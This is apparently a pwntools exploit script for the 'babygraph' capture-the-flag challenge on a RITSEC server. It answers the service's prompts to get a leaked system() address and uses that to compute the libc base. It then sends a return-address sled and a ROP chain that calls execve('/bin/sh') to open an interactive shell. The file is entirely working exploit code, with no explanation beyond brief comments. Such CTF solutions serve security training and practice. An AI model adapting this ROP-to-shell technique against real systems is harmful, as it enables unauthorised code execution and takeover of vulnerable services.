#!/usr/bin/python3

from pwn import *
import time

def guess(p, g): 
    x = p.recvuntil('(Y/N)\n', timeout=1) != ''
    if not x:
        return False
    p.sendline(b'Y' if g else b'N')
    return True

def binary_connect(local, debug):
    if local:
        if debug:
            p = gdb.debug('./babygraph', '''
                break *0x401628
                continue
            ''')
        else:
            p = process('./babygraph')

    else:
        # Create process from local 
        p = remote('challenges1.ritsec.club',1339)

    return p

def main():
    context.log_level = 'debug'
    local = False    
    debug = False

    if local:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    else:
        libc = ELF('./libc.so.6')

    r = ROP(libc)

    p = binary_connect(local, debug)

    # recv initial prompt 
    try:
        assert guess(p, False)
        assert guess(p, False)
        assert guess(p, False)
        assert guess(p, False)
        assert guess(p, False)

    except:
        return

    # get response
    p.recvuntil("prize: ")
    system_addr = p.recvline().strip()
    system_addr = int(system_addr, 16)

    # calculate system address

    # calculate libc base
    system_offset = libc.symbols['system']
    libc_base = system_addr - system_offset
    system_addr = system_offset + libc_base

    # binsh string
    bin_sh_offset = next(libc.search(b'/bin/sh\x00'))
    bin_sh_addr = bin_sh_offset + libc_base

    # pop rdi gadget
    pop_rdi_offset = r.find_gadget(['pop rdi', 'ret']).address
    pop_rdi_addr = pop_rdi_offset + libc_base

    # pop rsi gadget
    pop_rsi_offset = r.find_gadget(['pop rsi', 'ret']).address
    pop_rsi_addr = pop_rsi_offset + libc_base

    # pop rdx gadget
    if local:
        pop_rdx_offset = r.find_gadget(['pop rdx', 'ret']).address
    else:
        pop_rdx_offset = r.find_gadget(['pop rdx', 'pop r12', 'ret']).address
    pop_rdx_addr = pop_rdx_offset + libc_base
    
    # ret gadget
    ret_offset = r.find_gadget(['ret']).address
    ret_addr = ret_offset + libc_base

    # execve gadget
    execve_offset = libc.symbols['execve']
    execve_addr = execve_offset + libc_base

    # null ptr (*VALID* pointer to 0)
    nullptr_offset = next(libc.search(p64(0)))
    nullptr_addr = nullptr_offset + libc_base

    chain = [
        pop_rdi_addr,
        bin_sh_addr,    # rdi
        pop_rsi_addr,
        nullptr_addr,              # rsi
        pop_rdx_addr,
        nullptr_addr,              # rdx
        0,              # r12
        execve_addr,
    ]

    if local:
        chain.pop(6)

    # send ropchain
    p.sendline(p64(ret_addr) * (250 // 8) +  b''.join(p64(r) for r in chain))
    p.interactive()
    p.sendline(b'ls')
    print(p.recvall())

    # get interactive shell
    # p.interactive()
    p.close()


if __name__ == "__main__":
    main()
